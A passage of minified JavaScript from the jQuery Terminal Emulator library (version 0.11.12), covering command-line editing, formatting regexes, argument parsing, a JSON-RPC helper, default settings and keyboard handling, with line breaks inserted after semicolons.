else if(3===s)k=a.terminal.encode(o[0]),g.before("<div>"+k+"</div>"),c(o[1],R-n-1),k=a.terminal.encode(o[2]),h.after('<div class="clear">'+k+"</div>");
else{var z,A;
for(y=R,l=0;
l<o.length;
++l){var B=o[l].length;
if(!(y>B))break;
y-=B}A=o[l],z=l,y===A.length&&(y=0,A=o[++z]),c(A,y),f(o.slice(0,z)),e(o.slice(z+1))}}}}else""===j?(g.html(""),T.html("&nbsp;
"),h.html("")):c(j,R)}}(t),Y=function(){function b(b){J.html(a.terminal.format(a.terminal.encode(b))),x=J.text().length}return function(){switch(typeof E){case"string":b(E);
break;
case"function":E(b)}}}(),Z=!0,$=!1;
a.extend(t,{name:function(a){if(a!==b){G=a;
var c=H&&H.enabled()||!H;
return H=new l(a,S),c||H.disable(),t}return G},purge:function(){return H.clear(),t},history:function(){return H},"delete":function(a,b){var c;
return 0===a?t:(0>a?R>0&&(c=O.slice(0,R).slice(a),O=O.slice(0,R+a)+O.slice(R,O.length),b?p():t.position(R+a)):""!==O&&R<O.length&&(c=O.slice(R).slice(0,a),O=O.slice(0,R)+O.slice(R+a,O.length),p()),X(),e(),c)},set:function(a,c){return a!==b&&(O=a,c||t.position(O.length),X(),e(),p()),t},insert:function(a,b){return R===O.length?O+=a:O=0===R?a+O:O.slice(0,R)+a+O.slice(R),b?e():t.position(a.length,!0),X(),p(),t},get:function(){return O},commands:function(a){return a?(c.commands=a,t):a},destroy:function(){return _.unbind("keypress.cmd",q),_.unbind("keydown.cmd",o),_.unbind("paste.cmd",n),_.unbind("input.cmd",s),t.stopTime("blink",f),t.find(".cursor").next().remove().end().prev().remove().end().remove(),t.find(".prompt, .clipboard").remove(),t.removeClass("cmd").removeData("cmd"),t},prompt:function(a){if(a===b)return E;
if("string"!=typeof a&&"function"!=typeof a)throw new Error("prompt must be a function or string");
return E=a,Y(),X(),t},kill_text:function(){return Q},position:function(b,d){return"number"==typeof b?(d?R+=b:R=0>b?0:b>O.length?O.length:b,a.isFunction(c.onPositionChange)&&c.onPositionChange(R),X(),e(),t):R},visible:function(){var a=t.visible;
return function(){a.apply(t,[]),X(),Y()}}(),show:function(){var a=t.show;
return function(){a.apply(t,[]),X(),Y()}}(),resize:function(a){return a?w=a:k(),X(),t},enable:function(){return F=!0,t.addClass("enabled"),I(!0),d(),t},isenabled:function(){return F},disable:function(){return F=!1,t.removeClass("enabled"),I(!1),d(),t},mask:function(a){return"undefined"==typeof a?N:(N=a,X(),t)}}),t.name(c.name||c.prompt||""),E="string"==typeof c.prompt?c.prompt:"> ",Y(),(c.enabled===b||c.enabled===!0)&&t.enable();
var _=a(document.documentElement||window);
return _.bind("keypress.cmd",q).bind("keydown.cmd",o).bind("input.cmd",s),t.data("cmd",t),t};
var z=function(){var a=!1,c="animation",d="",e="Webkit Moz O ms Khtml".split(" "),f="",g=document.createElement("div");
if(g.style.animationName&&(a=!0),a===!1)for(var h=0;
h<e.length;
h++){var i=e[h]+"AnimationName";
if(g.style[i]!==b){f=e[h],c=f+"Animation",d="-"+f.toLowerCase()+"-",a=!0;
break}}return a}(),A=-1!=navigator.userAgent.toLowerCase().indexOf("android"),B=function(){return"ontouchstart"in window||window.DocumentTouch&&document instanceof DocumentTouch}(),C=/(\[\[[!gbiuso]*;
[^;
]*;
[^\]]*\](?:[^\]]*\\\][^\]]*|[^\]]*|[^\[]*\[[^\]]*)\]?)/i,D=/\[\[([!gbiuso]*);
([^;
]*);
([^;
\]]*);
?([^;
\]]*);
?([^\]]*)\]([^\]]*\\\][^\]]*|[^\]]*|[^\[]*\[[^\]]*)\]?/gi,E=/\[\[([!gbiuso]*;
[^;
\]]*;
[^;
\]]*(?:;
|[^\]()]*);
?[^\]]*)\]([^\]]*\\\][^\]]*|[^\]]*|[^\[]*\[[^\]]*)\]?/gi,F=/\[\[([!gbiuso]*;
[^;
\]]*;
[^;
\]]*(?:;
|[^\]()]*);
?[^\]]*)\]([^\]]*\\\][^\]]*|[^\]]*|[^\[]*\[[^\]]*)\]/gi,G=/^\[\[([!gbiuso]*;
[^;
\]]*;
[^;
\]]*(?:;
|[^\]()]*);
?[^\]]*)\]([^\]]*\\\][^\]]*|[^\]]*|[^\[]*\[[^\]]*)\]$/gi,H=/^#([0-9a-f]{3}|[0-9a-f]{6})$/i,I=/(\bhttps?:\/\/(?:(?:(?!&[^;
]+;
)|(?=&amp;
))[^\s"'<>\]\[)])+\b)/gi,J=/\b(https?:\/\/(?:(?:(?!&[^;
]+;
)|(?=&amp;
))[^\s"'<>\][)])+)\b(?![^[\]]*])/gi,K=/((([^<>('")[\]\\.,;
:\s@\"]+(\.[^<>()[\]\\.,;
:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,})))/g,L=/('[^']*'|"(\\"|[^"])*"|(?:\/(\\\/|[^\/])+\/[gimy]*)(?=:? |$)|(\\ |[^ ])+|[\w-]+)/gi,M=/(\[\[[!gbiuso]*;
[^;
]*;
[^\]]*\])/i,N=/^(\[\[[!gbiuso]*;
[^;
]*;
[^\]]*\])/i,O=/\[\[[!gbiuso]*;
[^;
]*;
[^\]]*\]?$/i,P=/(\[\[(?:[^\]]|\\\])*\]\])/;
a.terminal={version:"0.11.12",color_names:["black","silver","gray","white","maroon","red","purple","fuchsia","green","lime","olive","yellow","navy","blue","teal","aqua","aliceblue","antiquewhite","aqua","aquamarine","azure","beige","bisque","black","blanchedalmond","blue","blueviolet","brown","burlywood","cadetblue","chartreuse","chocolate","coral","cornflowerblue","cornsilk","crimson","cyan","darkblue","darkcyan","darkgoldenrod","darkgray","darkgreen","darkgrey","darkkhaki","darkmagenta","darkolivegreen","darkorange","darkorchid","darkred","darksalmon","darkseagreen","darkslateblue","darkslategray","darkslategrey","darkturquoise","darkviolet","deeppink","deepskyblue","dimgray","dimgrey","dodgerblue","firebrick","floralwhite","forestgreen","fuchsia","gainsboro","ghostwhite","gold","goldenrod","gray","green","greenyellow","grey","honeydew","hotpink","indianred","indigo","ivory","khaki","lavender","lavenderblush","lawngreen","lemonchiffon","lightblue","lightcoral","lightcyan","lightgoldenrodyellow","lightgray","lightgreen","lightgrey","lightpink","lightsalmon","lightseagreen","lightskyblue","lightslategray","lightslategrey","lightsteelblue","lightyellow","lime","limegreen","linen","magenta","maroon","mediumaquamarine","mediumblue","mediumorchid","mediumpurple","mediumseagreen","mediumslateblue","mediumspringgreen","mediumturquoise","mediumvioletred","midnightblue","mintcream","mistyrose","moccasin","navajowhite","navy","oldlace","olive","olivedrab","orange","orangered","orchid","palegoldenrod","palegreen","paleturquoise","palevioletred","papayawhip","peachpuff","peru","pink","plum","powderblue","purple","red","rosybrown","royalblue","saddlebrown","salmon","sandybrown","seagreen","seashell","sienna","silver","skyblue","slateblue","slategray","slategrey","snow","springgreen","steelblue","tan","teal","thistle","tomato","turquoise","violet","wheat","white","whitesmoke","yellow","yellowgreen"],valid_color:function(b){return b.match(H)?!0:-1!==a.inArray(b.toLowerCase(),a.terminal.color_names)},escape_regex:function(a){if("string"==typeof a){var b=/([-\\\^$\[\]()+{}?*.|])/g;
return a.replace(b,"\\$1")}},have_formatting:function(a){return"string"==typeof a&&!!a.match(F)},is_formatting:function(a){return"string"==typeof a&&!!a.match(G)},format_split:function(a){return a.split(C)},split_equal:function(b,c,d){function e(){return"&nbsp;
"==m.substring(q-6,q)||" "==m.substring(q-1,q)}for(var f=!1,g=!1,h="",i=[],j=b.replace(E,function(a,b,c){var d=b.match(/;
/g).length;
if(d>=4)return a;
d=2==d?";
;
":3==d?";
":"";
var e=c.replace(/\\\]/g,"&#93;
").replace(/\n/g,"\\n").replace(/&nbsp;
/g," ");
return"[["+b+d+e+"]"+c+"]"}).split(/\n/g),k=0,l=j.length;
l>k;
++k)if(""!==j[k])for(var m=j[k],n=0,o=0,p=-1,q=0,r=m.length;
r>q;
++q){if(m.substring(q).match(N))f=!0,g=!1;
else if(f&&"]"===m[q])g?(f=!1,g=!1):g=!0;
else if(f&&g||!f){if("&"===m[q]){var s=m.substring(q).match(/^(&[^;
]+;
)/);
if(!s)throw new Error("Unclosed html entity in line "+(k+1)+" at char "+(q+1));
q+=s[1].length-2,q===r-1&&i.push(t+s[1]);
continue}"]"===m[q]&&"\\"===m[q-1]?--o:++o}if(e()&&(f&&g||!f||"["===m[q]&&"["===m[q+1])&&(p=q),(o===c||q===r-1)&&(f&&g||!f)){var t,u=a.terminal.strip(m.substring(p));
u=a("<span>"+u+"</span>").text();
var v=u.length;
u=u.substring(0,q+c+1);
var w=!!u.match(/\s/)||q+c+1>v;
d&&-1!=p&&q!==r-1&&w?(t=m.substring(n,p),q=p-1):t=m.substring(n,q+1),d&&(t=t.replace(/(&nbsp;
|\s)+$/g,"")),p=-1,n=q+1,o=0,h&&(t=h+t,t.match("]")&&(h=""));
var x=t.match(E);
if(x){var y=x[x.length-1];
if("]"!==y[y.length-1])h=y.match(M)[1],t+="]";
else if(t.match(O)){t.length;
t=t.replace(O,""),h=y.match(M)[1]}}i.push(t)}}else i.push("");
return i},encode:function(a){return a=a.replace(/&(?!#[0-9]+;
|[a-zA-Z]+;
)/g,"&amp;
"),a.replace(/</g,"&lt;
").replace(/>/g,"&gt;
").replace(/ /g,"&nbsp;
").replace(/\t/g,"&nbsp;
&nbsp;
&nbsp;
&nbsp;
")},escape_formatting:function(b){return a.terminal.escape_brackets(a.terminal.encode(b))},format:function(b,c){var d=a.extend({},{linksNoReferrer:!1},c||{});
if("string"==typeof b){var e=a.terminal.format_split(b);
return b=a.map(e,function(b){return""===b?b:a.terminal.is_formatting(b)?(b=b.replace(/\[\[[^\]]+\]/,function(a){return a.replace(/&nbsp;
/g," ")}),b.replace(D,function(b,c,e,f,g,h,i){if(""===i)return"";
i=i.replace(/\\]/g,"]");
var j="";
-1!==c.indexOf("b")&&(j+="font-weight:bold;
");
var k=[];
-1!==c.indexOf("u")&&k.push("underline"),-1!==c.indexOf("s")&&k.push("line-through"),-1!==c.indexOf("o")&&k.push("overline"),k.length&&(j+="text-decoration:"+k.join(" ")+";
"),-1!==c.indexOf("i")&&(j+="font-style:italic;
"),a.terminal.valid_color(e)&&(j+="color:"+e+";
",-1!==c.indexOf("g")&&(j+="text-shadow:0 0 5px "+e+";
")),a.terminal.valid_color(f)&&(j+="background-color:"+f);
var l;
l=""===h?i:h.replace(/&#93;
/g,"]");
var m;
return-1!==c.indexOf("!")?l.match(K)?m='<a href="mailto:'+l+'" ':(m='<a target="_blank" href="'+l+'" ',d.linksNoReferrer&&(m+='rel="noreferrer" ')):m="<span",""!==j&&(m+=' style="'+j+'"'),""!==g&&(m+=' class="'+g+'"'),m+=-1!==c.indexOf("!")?">"+i+"</a>":' data-text="'+l.replace('"',"&quote;
")+'">'+i+"</span>"})):"<span>"+b.replace(/\\\]/g,"]")+"</span>"}).join(""),b.replace(/<span><br\s*\/
?><\/span>/gi,"<br/>")}return""},escape_brackets:function(a){return a.replace(/\[/g,"&#91;
").replace(/\]/g,"&#93;
")},strip:function(a){return a.replace(D,"$6")},active:function(){return Z.front()},last_id:function(){var a=Z.length();
return a?a-1:void 0},parseArguments:function(b){return a.terminal.parse_arguments(b)},splitArguments:function(b){return a.terminal.split_arguments(b)},parseCommand:function(b){return a.terminal.parse_command(b)},splitCommand:function(b){return a.terminal.split_command(b)},parse_arguments:function(b){var c=/^[-+]?[0-9]*\.?[0-9]+([eE][-+]?[0-9]+)?$/;
return a.map(b.match(L)||[],function(a){if("'"===a[0]&&"'"===a[a.length-1])return a.replace(/^'|'$/g,"");
if('"'===a[0]&&'"'===a[a.length-1])return a=a.replace(/^"|"$/g,"").replace(/\\([" ])/g,"$1"),a.replace(/\\\\|\\t|\\n/g,function(a){return"t"===a[1]?" ":"n"===a[1]?"\n":"\\"}).replace(/\\x([0-9a-f]+)/gi,function(a,b){return String.fromCharCode(parseInt(b,16))}).replace(/\\0([0-7]+)/g,function(a,b){return String.fromCharCode(parseInt(b,8))});
if(a.match(/^\/(\\\/|[^\/])+\/[gimy]*$/)){var b=a.match(/^\/([^\/]+)\/([^\/]*)$/);
return new RegExp(b[1],b[2])}return a.match(/^-?[0-9]+$/)?parseInt(a,10):a.match(c)?parseFloat(a):a.replace(/\\ /g," ")})},split_arguments:function(b){return a.map(b.match(L)||[],function(a){return"'"===a[0]&&"'"===a[a.length-1]?a.replace(/^'|'$/g,""):'"'===a[0]&&'"'===a[a.length-1]?a.replace(/^"|"$/g,"").replace(/\\([" ])/g,"$1"):a.match(/\/.*\/[gimy]*$/)?a:a.replace(/\\ /g," ")})},parse_command:function(b){return n(b,a.terminal.parse_arguments)},split_command:function(b){return n(b,a.terminal.split_arguments)},extended_command:function(a,b){try{_=!1,a.exec(b,!0).then(function(){_=!0})}catch(c){}}},a.fn.visible=function(){return this.css("visibility","visible")},a.fn.hidden=function(){return this.css("visibility","hidden")};
var Q={};
a.jrpc=function(b,c,d,e,f){Q[b]=Q[b]||0;
var g=a.json_stringify({jsonrpc:"2.0",method:c,params:d,id:++Q[b]});
return a.ajax({url:b,data:g,success:function(b,c,d){var g=d.getResponseHeader("Content-Type");
if(!g.match(/application\/json/)){var h="Response Content-Type is not application/json";
if(!console||!console.warn)throw new Error("WARN: "+h);
console.warn(h)}var i;
try{i=a.parseJSON(b)}catch(j){if(!f)throw new Error("Invalid JSON");
return void f(d,"Invalid JSON",j)}e(i,c,d)},error:f,contentType:"application/json",dataType:"text",async:!0,cache:!1,type:"POST"})};
var R=!a.terminal.version.match(/^\{\{/),S="Copyright (c) 2011-2016 Jakub Jankiewicz <http://jcubic.pl>",T=R?" v. "+a.terminal.version:" ",U=new RegExp(" {"+T.length+"}$"),V="jQuery Terminal Emulator"+(R?T:""),W=[["jQuery Terminal","(c) 2011-2016 jcubic"],[V,S.replace(/^Copyright | *<.*>/g,"")],[V,S.replace(/^Copyright /,"")],[" _______ ________ __"," / / _ /_ ____________ _/__ ___/______________ _____ / /"," __ / / // / // / _ / _/ // / / / _ / _/ / / \\/ / _ \\/ /","/ / / // / // / ___/ // // / / / ___/ // / / / / /\\ / // / /__","\\___/____ \\\\__/____/_/ \\__ / /_/____/_//_/_/_/ /_/ \\/\\__\\_\\___/"," \\/ /____/ ".replace(U," ")+T,S],[" __ _____ ________ __"," / // _ /__ __ _____ ___ __ _/__ ___/__ ___ ______ __ __ __ ___ / /"," __ / // // // // // _ // _// // / / // _ // _// // // \\/ // _ \\/ /","/ / // // // // // ___// / / // / / // ___// / / / / // // /\\ // // / /__","\\___//____ \\\\___//____//_/ _\\_ / /_//____//_/ /_/ /_//_//_/ /_/ \\__\\_\\___/"," \\/ /____/ ".replace(U,"")+T,S]];
a.terminal.defaults={prompt:"> ",history:!0,exit:!0,clear:!0,enabled:!0,historySize:60,maskChar:"*",checkArity:!0,raw:!1,exceptionHandler:null,cancelableAjax:!0,processArguments:!0,linksNoReferrer:!1,processRPCResponse:null,Token:!0,convertLinks:!0,historyState:!1,echoCommand:!0,scrollOnEcho:!0,login:null,outputLimit:-1,formatters:[],onAjaxError:null,onRPCError:null,completion:!1,historyFilter:null,onInit:a.noop,onClear:a.noop,onBlur:a.noop,onFocus:a.noop,onTerminalChange:a.noop,onExit:a.noop,keypress:a.noop,keydown:a.noop,strings:{wrongPasswordTryAgain:"Wrong password try again!",wrongPassword:"Wrong password!",ajaxAbortError:"Error while aborting ajax call!",wrongArity:"Wrong number of arguments. Function '%s' expects %s got %s!",commandNotFound:"Command '%s' Not Found!",oneRPCWithIgnore:"You can use only one rpc with ignoreSystemDescribe",oneInterpreterFunction:"You can't use more than one function (rpcwith ignoreSystemDescribe counts as one)",loginFunctionMissing:"You didn't specify a login function",noTokenError:"Access denied (no token)",serverResponse:"Server responded",wrongGreetings:"Wrong value of greetings parameter",notWhileLogin:"You can't call `%s' function while in login",loginIsNotAFunction:"Authenticate must be a function",canExitError:"You can't exit from main interpreter",invalidCompletion:"Invalid completion",invalidSelector:'Sorry, but terminal said that "%s" is not valid selector!',invalidTerminalId:"Invalid Terminal ID",login:"login",password:"password",recursiveCall:"Recursive call detected, skip"}};
var X,Y=[],Z=new j,$=[],_=!1,aa=!0,ba=!0;
a.fn.terminal=function(c,d){function e(b){return a.isFunction(xa.processArguments)?n(b,xa.processArguments):xa.processArguments?a.terminal.parse_command(b):a.terminal.split_command(b)}function f(b){"string"==typeof b?ha.echo(b):b instanceof Array?ha.echo(a.map(b,function(b){return a.json_stringify(b)}).join(" ")):"object"==typeof b?ha.echo(a.json_stringify(b)):ha.echo(b)}function g(b){var c=/(.*):([0-9]+):([0-9]+)$/,d=b.match(c);
d&&(ha.pause(),a.get(d[1],function(b){var c=location.href.replace(/[^\/]+$/,""),e=d[1].replace(c,"");
ha.echo("[[b;
white;
]"+e+"]");
var f=b.split("\n"),g=+d[2]-1;
ha.echo(f.slice(g-2,g+3).map(function(b,c){return 2==c&&(b="[[;
#f00;
]"+a.terminal.escape_brackets(b)+"]"),"["+(g+c)+"]: "+b}).join("\n")).resume()},"text"))}function h(b){if(a.isFunction(xa.onRPCError))xa.onRPCError.call(ha,b);
else if(ha.error("&#91;
RPC&#93;
 "+b.message),b.error&&b.error.message){b=b.error;
var c=" "+b.message;
b.file&&(c+=' in file "'+b.file.replace(/.*\//,"")+'"'),b.at&&(c+=" at line "+b.at),ha.error(c)}}function i(b,c){var d=function(c,d){ha.pause(),a.jrpc(b,c,d,function(b){b.error?h(b.error):a.isFunction(xa.processRPCResponse)?xa.processRPCResponse.call(ha,b.result,ha):f(b.result),ha.resume()},l)};
return function(a,b){if(""!==a){try{a=e(a)}catch(f){return void b.error(f.toString())}if(c&&"help"!==a.name){
 var g=b.token();
g?d(a.name,[g].concat(a.args)):b.error("&#91;
AUTH&#93;
 "+ya.noTokenError)}else d(a.name,a.args)}}}function j(c,d,f,g){return function(h,i){if(""!==h){var k;
try{k=e(h)}catch(l){return void ha.error(l.toString())}var m=c[k.name],n=a.type(m);
if("function"===n){if(!d||m.length===k.args.length)return m.apply(ha,k.args);
ha.error("&#91;
Arity&#93;
 "+sprintf(ya.wrongArity,k.name,m.length,k.args.length))}else if("object"===n||"string"===n){var o=[];
"object"===n&&(o=Object.keys(m),m=j(m,d,f)),i.push(m,{prompt:k.name+"> ",name:k.name,completion:"object"===n?o:b})}else a.isFunction(g)?g(h,ha):a.isFunction(xa.onCommandNotFound)?xa.onCommandNotFound(h,ha):i.error(sprintf(ya.commandNotFound,k.name))}}}function l(b,c,d){ha.resume(),a.isFunction(xa.onAjaxError)?xa.onAjaxError.call(ha,b,c,d):"abort"!==c&&ha.error("&#91;
AJAX&#93;
 "+c+" - "+ya.serverResponse+": \n"+a.terminal.escape_brackets(b.responseText))}function m(b,c,d){a.jrpc(b,"system.describe",[],function(e){if(e.procs){var g={};
a.each(e.procs,function(d,e){g[e.name]=function(){var d=c&&"help"!=e.name,g=Array.prototype.slice.call(arguments),i=g.length+(d?1:0);
if(xa.checkArity&&e.params&&e.params.length!==i)ha.error("&#91;
Arity&#93;
 "+sprintf(ya.wrongArity,e.name,e.params.length,i));
else{if(ha.pause(),d){var j=ha.token(!0);
j?g=[j].concat(g):ha.error("&#91;
AUTH&#93;
 "+ya.noTokenError)}a.jrpc(b,e.name,g,function(b){b.error?h(b.error):a.isFunction(xa.processRPCResponse)?xa.processRPCResponse.call(ha,b.result,ha):f(b.result),ha.resume()},l)}}}),g.help=g.help||function(b){if("undefined"==typeof b)ha.echo("Available commands: "+e.procs.map(function(a){return a.name}).join(", ")+", help");
else{var c=!1;
if(a.each(e.procs,function(a,d){if(d.name==b){c=!0;
var e="";
return e+="[[bu;
#fff;
]"+d.name+"]",d.params&&(e+=" "+d.params.join(" ")),d.help&&(e+="\n"+d.help),ha.echo(e),!1}}),!c)if("help"==b)ha.echo("[[bu;
#fff;
]help] [method]\ndisplay help for the method or list of methods if not specified");
else{var d="Method `"+b.toString()+"' not found ";
ha.error(d)}}},d(g)}else d(null)},function(){d(null)})}function o(b,c,d){d=d||a.noop;
var e,f,g=a.type(b),h={},k=0;
if("array"===g)e={},function l(b,d){if(b.length){var g=b[0],h=b.slice(1),j=a.type(g);
"string"===j?(k++,ha.pause(),xa.ignoreSystemDescribe?(1===k?f=i(g,c):ha.error(ya.oneRPCWithIgnore),l(h,d)):m(g,c,function(b){b&&a.extend(e,b),ha.resume(),l(h,d)})):"function"===j?(f?ha.error(ya.oneInterpreterFunction):f=g,l(h,d)):"object"===j&&(a.extend(e,g),l(h,d))}else d()}(b,function(){d({interpreter:j(e,!1,c,f),completion:Object.keys(e)})});
else if("string"===g)xa.ignoreSystemDescribe?(e={interpreter:i(b,c)},a.isArray(xa.completion)&&(e.completion=xa.completion),d(e)):(ha.pause(),m(b,c,function(a){a?(h.interpreter=j(a,!1,c),h.completion=Object.keys(a)):h.interpreter=i(b,c),d(h),ha.resume()}));
else if("object"===g)d({interpreter:j(b,xa.checkArity),completion:Object.keys(b)});
else{if("undefined"===g)b=a.noop;
else if("function"!==g)throw g+" is invalid interpreter value";
d({interpreter:b,completion:xa.completion})}}function t(b,c){var d="boolean"===a.type(c)?"login":c;
return function(c,e,f,g){ha.pause(),a.jrpc(b,d,[c,e],function(a){f(!a.error&&a.result?a.result:null),ha.resume()},l)}}function v(a){return"string"==typeof a?a:"string"==typeof a.fileName?a.fileName+": "+a.message:a.message}function w(b,c){a.isFunction(xa.exceptionHandler)?xa.exceptionHandler.call(ha,b):ha.exception(b,c)}function x(){var a;
a=ia.prop?ia.prop("scrollHeight"):ia.attr("scrollHeight"),ia.scrollTop(a)}function y(b,c){try{if(a.isFunction(c))c(function(){});
else if("string"!=typeof c){var d=b+" must be string or function";
throw d}}catch(e){return w(e,b.toUpperCase()),!1}return!0}function z(b,c){xa.convertLinks&&(b=b.replace(K,"[[!;
;
]$1]").replace(J,"[[!;
;
]$1]"));
var d,e,f=a.terminal.defaults.formatters;
if(!c.raw){for(d=0;
d<f.length;
++d)try{if("function"==typeof f[d]){var g=f[d](b);
"string"==typeof g&&(b=g)}}catch(h){alert("formatting error at formatters["+d+"]\n"+(h.stack?h.stack:h))}b=a.terminal.encode(b)}if(da.push(ea),!c.raw&&(b.length>la||b.match(/\n/))){var i=c.keepWords,j=a.terminal.split_equal(b,la,i);
for(d=0,e=j.length;
e>d;
++d)""===j[d]||"\r"===j[d]?da.push("<span></span>"):c.raw?da.push(j[d]):da.push(a.terminal.format(j[d],{linksNoReferrer:xa.linksNoReferrer}))}else c.raw||(b=a.terminal.format(b,{linksNoReferrer:xa.linksNoReferrer})),da.push(b);
da.push(c.finalize)}function A(b,c){try{var d=a.extend({exec:!0,raw:!1,finalize:a.noop},c||{}),e="function"===a.type(b)?b():b;
e="string"===a.type(e)?e:String(e),""!==e&&(d.exec?(e=a.map(e.split(P),function(b){return b.match(P)&&!a.terminal.is_formatting(b)?(b=b.replace(/^\[\[|\]\]$/g,""),ja&&ja.command==b?ha.error(ya.recursiveCall):a.terminal.extended_command(ha,b),""):b}).join(""),""!==e&&z(e,d)):z(e,d))}catch(f){da=[],alert("[Internal Exception(process_line)]:"+v(f)+"\n"+f.stack)}}function C(){Ka.resize(la);
var b,c=ka.empty().detach();
if(xa.outputLimit>=0){var d=0===xa.outputLimit?ha.rows():xa.outputLimit;
b=qa.slice(qa.length-d-1)}else b=qa;
try{da=[],a.each(b,function(a,b){A.apply(null,b)}),Ka.before(c),ha.flush()}catch(e){alert("Exception in redraw\n"+e.stack)}}function D(){if(xa.greetings===b)ha.echo(ha.signature);
else if(xa.greetings){var a=typeof xa.greetings;
"string"===a?ha.echo(xa.greetings):"function"===a?xa.greetings.call(ha,ha.echo):ha.error(ya.wrongGreetings)}}function E(b){var c=Ka.prompt(),d=Ka.mask();
switch(typeof d){case"string":b=b.replace(/./g,d);
break;
case"boolean":b=d?b.replace(/./g,xa.maskChar):a.terminal.escape_formatting(b)}var e={finalize:function(a){a.addClass("command")}};
a.isFunction(c)?c(function(a){ha.echo(a+b,e)}):ha.echo(c+b,e)}function F(a){var b=Z.get()[a[0]];
if(!b)throw new Error(ya.invalidTerminalId);
var c=a[1];
if($[c])b.import_view($[c]);
else{_=!1;
var d=a[2];
d&&b.exec(d).then(function(){_=!0,$[c]=b.export_view()})}}function G(){_&&(aa=!1,location.hash="#"+a.json_stringify(X),setTimeout(function(){aa=!0},100))}function H(c,d,e){function g(){e||(_=!0,xa.historyState&&ha.save_state(c,!1),_=j),i.resolve(),a.isFunction(xa.onAfterCommand)&&xa.onAfterCommand(ha,c)}ca=c,fa&&(fa=!1,(xa.historyState||xa.execHash&&e)&&($.length?ha.save_state(null):ha.save_state()));
try{if(a.isFunction(xa.onBeforeCommand)&&xa.onBeforeCommand(ha,c)===!1)return;
e||(ja=a.terminal.split_command(c)),S()||e&&(a.isFunction(xa.historyFilter)&&xa.historyFilter(c)||c.match(xa.historyFilter))&&Ka.history().append(c);
var h=Ja.top();
!d&&xa.echoCommand&&E(c);
var i=new a.Deferred,j=_;
if(c.match(/^\s*login\s*$/)&&ha.token(!0))ha.level()>1?ha.logout(!0):ha.logout(),g();
else if(xa.exit&&c.match(/^\s*exit\s*$/)&&!ua){var k=ha.level();
(1==k&&ha.get_token()||k>1)&&(ha.get_token(!0)&&ha.set_token(b,!0),ha.pop()),g()}else if(xa.clear&&c.match(/^\s*clear\s*$/)&&!ua)ha.clear(),g();
else{var l=qa.length-1,m=h.interpreter.call(ha,c,ha);
if(m!==b)return ha.pause(!0),a.when(m).then(function(a){a&&l===qa.length-1&&f(a),g(),ha.resume()});
if(Ba){ga.push(function(){g()})}else g()}return i.promise()}catch(n){throw w(n,"USER"),ha.resume(),n}}function L(){if(a.isFunction(xa.onBeforeLogout))try{if(xa.onBeforeLogout(ha)===!1)return}catch(b){w(b,"onBeforeLogout")}if(M(),a.isFunction(xa.onAfterLogout))try{xa.onAfterLogout(ha)}catch(b){w(b,"onAfterlogout")}ha.login(xa.login,!0,Q)}function M(){var b=ha.prefix_name(!0)+"_";
a.Storage.remove(b+"token"),a.Storage.remove(b+"login")}function N(b){var c=ha.prefix_name()+"_interpreters",d=a.Storage.get(c);
d=d?a.parseJSON(d):[],-1==a.inArray(b,d)&&(d.push(b),a.Storage.set(c,a.json_stringify(d)))}function O(b){var c=Ja.top(),d=ha.prefix_name(!0);
S()||N(d),Ka.name(d),a.isFunction(c.prompt)?Ka.prompt(function(a){c.prompt(a,ha)}):Ka.prompt(c.prompt),Ka.set(""),!b&&a.isFunction(c.onStart)&&c.onStart(ha)}function Q(){function b(){if(aa&&xa.execHash)try{if(location.hash){var b=location.hash.replace(/^#/,"");
X=a.parseJSON(decodeURIComponent(b))}else X=[];
X.length?F(X[X.length-1]):$[0]&&ha.import_view($[0])}catch(c){w(c,"TERMINAL")}}O(),D();
var c=!1;
if(a.isFunction(xa.onInit)){va=function(){c=!0};
try{xa.onInit(ha)}catch(d){w(d,"OnInit")}finally{va=a.noop,c||ha.resume()}}ba&&(ba=!1,a.fn.hashchange?a(window).hashchange(b):a(window).bind("hashchange",b))}function R(b,c,d){xa.clear&&-1==a.inArray("clear",d)&&d.push("clear"),xa.exit&&-1==a.inArray("exit",d)&&d.push("exit");
var e=Ka.get().substring(0,Ka.position());
if(e===b){for(var f=new RegExp("^"+a.terminal.escape_regex(c)),g=[],h=d.length;
h--;
)f.test(d[h])&&g.push(d[h]);
if(1===g.length)ha.insert(g[0].replace(f,""));
else if(g.length>1)if(pa>=2){E(b);
var i=g.reverse().join(" ");
ha.echo(a.terminal.escape_brackets(i),{keepWords:!0}),pa=0}else{var j,k=!1;
a:for(j=c.length;
j<g[0].length;
++j){for(h=1;
h<g.length;
++h)if(g[0].charAt(j)!==g[h].charAt(j))break a;
k=!0}k&&ha.insert(g[0].slice(0,j).replace(f,""))}}}function S(){return ua||Ka.mask()!==!1}function T(c){var d,e,f,g=Ja.top();
if(!ha.paused()&&ha.enabled()){if(a.isFunction(g.keydown)){if(d=g.keydown(c,ha),d!==b)return d}else if(a.isFunction(xa.keydown)&&(d=xa.keydown(c,ha),d!==b))return d;
if(f=xa.completion&&"boolean"!=a.type(xa.completion)&&g.completion===b?xa.completion:g.completion,"settings"==f&&(f=xa.completion),ha.oneTime(10,function(){Da()}),9!==c.which&&(pa=0),68===c.which&&c.ctrlKey)return ua||(""===Ka.get()?Ja.size()>1||xa.login!==b?ha.pop(""):(ha.resume(),ha.echo("")):ha.set_command("")),!1;
if(76===c.which&&c.ctrlKey)ha.clear();
else{if(f&&9===c.which){++pa;
var h,i=Ka.position(),j=Ka.get().substring(0,i),k=j.split(" ");
if(1==ya.length)h=k[0];
else for(h=k[k.length-1],e=k.length-1;
e>0&&"\\"==k[e-1][k[e-1].length-1];
e--)h=k[e-1]+" "+h;
switch(a.type(f)){case"function":f(ha,h,function(a){R(j,h,a)});
break;
case"array":R(j,h,f);
break;
default:throw new Error(ya.invalidCompletion)}return!1}if((118===c.which||86===c.which)&&(c.ctrlKey||c.metaKey))return void ha.oneTime(1,function(){x()});
if(9===c.which&&c.ctrlKey){if(Z.length()>1)return ha.focus(!1),!1}else 34===c.which?ha.scroll(ha.height()):33===c.which?ha.scroll(-ha.height()):ha.attr({scrollTop:ha.attr("scrollHeight")})}}else if(68===c.which&&c.ctrlKey){if(Y.length){for(e=Y.length;
e--;
){var l=Y[e];
if(4!==l.readyState)try{l.abort()}catch(m){ha.error(ya.ajaxAbortError)}}Y=[],ha.resume()}return!1}}function U(){La&&ha.focus()}function V(){La=za,ha.disable()}var ca,da=[],ea=1,fa=!0,ga=[],ha=this;
